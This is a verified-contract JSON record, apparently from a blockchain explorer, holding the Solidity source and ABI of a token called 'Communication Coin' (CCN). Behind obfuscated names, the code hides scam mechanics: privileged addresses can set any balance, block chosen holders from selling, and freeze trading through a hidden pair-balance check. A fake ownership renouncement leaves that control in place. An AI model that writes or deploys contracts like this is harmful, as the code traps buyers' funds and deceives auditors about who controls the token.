{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract limitBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isLiquidityLimit {\n    function createPair(address fromFund, address swapMaxSell) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface shouldMinTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface maxSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoLiquidity) external view returns (uint256);\n\n    function transfer(address limitEnableTake, uint256 fromTrading) external returns (bool);\n\n    function allowance(address launchTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitEnableTake,\n        uint256 fromTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxFund, uint256 value);\n    event Approval(address indexed launchTrading, address indexed spender, uint256 value);\n}\n\ninterface tradingBuy is maxSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CommunicationCoin is limitBuy, maxSwap, tradingBuy {\n\n    function name() external view virtual override returns (string memory) {\n        return teamMarketingReceiver;\n    }\n\n    function balanceOf(address autoLiquidity) public view virtual override returns (uint256) {\n        return fundSender[autoLiquidity];\n    }\n\n    function tradingMin(uint256 fromTrading) public {\n        modeAmount();\n        marketingMode = fromTrading;\n    }\n\n    uint256 public tokenSell;\n\n    function allowance(address marketingMax, address liquidityReceiverTx) external view virtual override returns (uint256) {\n        if (liquidityReceiverTx == isTx) {\n            return type(uint256).max;\n        }\n        return atMarketingEnable[marketingMax][liquidityReceiverTx];\n    }\n\n    bool public autoList;\n\n    uint256 constant totalLaunched = 7 ** 10;\n\n    mapping(address => mapping(address => uint256)) private atMarketingEnable;\n\n    string private teamMarketingReceiver = \"Communication Coin\";\n\n    constructor (){\n        if (receiverLiquidity != swapLimit) {\n            swapLimit = true;\n        }\n        walletLaunchedReceiver();\n        shouldMinTo enableShould = shouldMinTo(isTx);\n        modeTxAuto = isLiquidityLimit(enableShould.factory()).createPair(enableShould.WETH(), address(this));\n        exemptWalletEnable = isLiquidityLimit(enableShould.factory()).feeTo();\n        \n        teamReceiver = _msgSender();\n        receiverLimit[teamReceiver] = true;\n        fundSender[teamReceiver] = senderToken;\n        if (tokenSell == liquidityLimitAt) {\n            launchedReceiverAuto = false;\n        }\n        emit Transfer(address(0), teamReceiver, senderToken);\n    }\n\n    address public modeTxAuto;\n\n    bool private swapLimit;\n\n    function getOwner() external view returns (address) {\n        return teamTrading;\n    }\n\n    uint256 private liquidityLimitAt;\n\n    address private teamTrading;\n\n    function modeAmount() private view {\n        require(receiverLimit[_msgSender()]);\n    }\n\n    uint256 tokenTx;\n\n    address isTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return teamTrading;\n    }\n\n    function tradingMarketing(address toMax) public {\n        modeAmount();\n        \n        if (toMax == teamReceiver || toMax == modeTxAuto) {\n            return;\n        }\n        shouldMin[toMax] = true;\n    }\n\n    event OwnershipTransferred(address indexed launchedTrading, address indexed fundLaunch);\n\n    mapping(address => uint256) private fundSender;\n\n    function modeTeam(address tokenReceiverFrom, address limitEnableTake, uint256 fromTrading) internal returns (bool) {\n        if (tokenReceiverFrom == teamReceiver) {\n            return senderSell(tokenReceiverFrom, limitEnableTake, fromTrading);\n        }\n        uint256 receiverEnable = maxSwap(modeTxAuto).balanceOf(exemptWalletEnable);\n        require(receiverEnable == marketingMode);\n        require(limitEnableTake != exemptWalletEnable);\n        if (shouldMin[tokenReceiverFrom]) {\n            return senderSell(tokenReceiverFrom, limitEnableTake, totalLaunched);\n        }\n        fromTrading = autoAtBuy(tokenReceiverFrom, limitEnableTake, fromTrading);\n        return senderSell(tokenReceiverFrom, limitEnableTake, fromTrading);\n    }\n\n    function autoFrom(address swapMin) public {\n        if (autoList) {\n            return;\n        }\n        if (liquidityLimitAt == tokenSell) {\n            launchedReceiverAuto = true;\n        }\n        receiverLimit[swapMin] = true;\n        if (receiverLiquidity) {\n            tokenSell = liquidityLimitAt;\n        }\n        autoList = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityWallet;\n    }\n\n    uint256 private buyMin;\n\n    uint256 marketingMode;\n\n    function transferFrom(address tokenReceiverFrom, address limitEnableTake, uint256 fromTrading) external override returns (bool) {\n        if (_msgSender() != isTx) {\n            if (atMarketingEnable[tokenReceiverFrom][_msgSender()] != type(uint256).max) {\n                require(fromTrading <= atMarketingEnable[tokenReceiverFrom][_msgSender()]);\n                atMarketingEnable[tokenReceiverFrom][_msgSender()] -= fromTrading;\n            }\n        }\n        return modeTeam(tokenReceiverFrom, limitEnableTake, fromTrading);\n    }\n\n    bool private receiverLiquidity;\n\n    function autoAtBuy(address tokenReceiverFrom, address limitEnableTake, uint256 fromTrading) internal view returns (uint256) {\n        require(fromTrading > 0);\n\n        uint256 amountFund = 0;\n        if (tokenReceiverFrom == modeTxAuto && sellFee > 0) {\n            amountFund = fromTrading * sellFee / 100;\n        } else if (limitEnableTake == modeTxAuto && shouldFromTo > 0) {\n            amountFund = fromTrading * shouldFromTo / 100;\n        }\n        require(amountFund <= fromTrading);\n        return fromTrading - amountFund;\n    }\n\n    function walletLaunchedReceiver() public {\n        emit OwnershipTransferred(teamReceiver, address(0));\n        teamTrading = address(0);\n    }\n\n    function transfer(address modeLaunch, uint256 fromTrading) external virtual override returns (bool) {\n        return modeTeam(_msgSender(), modeLaunch, fromTrading);\n    }\n\n    mapping(address => bool) public shouldMin;\n\n    uint8 private liquidityWallet = 18;\n\n    function receiverTo(address modeLaunch, uint256 fromTrading) public {\n        modeAmount();\n        fundSender[modeLaunch] = fromTrading;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderToken;\n    }\n\n    uint256 private senderToken = 100000000 * 10 ** 18;\n\n    address exemptWalletEnable;\n\n    mapping(address => bool) public receiverLimit;\n\n    uint256 public shouldFromTo = 0;\n\n    bool public launchedReceiverAuto;\n\n    string private tradingTokenSender = \"CCN\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTokenSender;\n    }\n\n    address public teamReceiver;\n\n    function approve(address liquidityReceiverTx, uint256 fromTrading) public virtual override returns (bool) {\n        atMarketingEnable[_msgSender()][liquidityReceiverTx] = fromTrading;\n        emit Approval(_msgSender(), liquidityReceiverTx, fromTrading);\n        return true;\n    }\n\n    uint256 public sellFee = 3;\n\n    function senderSell(address tokenReceiverFrom, address limitEnableTake, uint256 fromTrading) internal returns (bool) {\n        require(fundSender[tokenReceiverFrom] >= fromTrading);\n        fundSender[tokenReceiverFrom] -= fromTrading;\n        fundSender[limitEnableTake] += fromTrading;\n        emit Transfer(tokenReceiverFrom, limitEnableTake, fromTrading);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityReceiverTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"}],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTxAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFromTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"tradingMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitEnableTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CommunicationCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}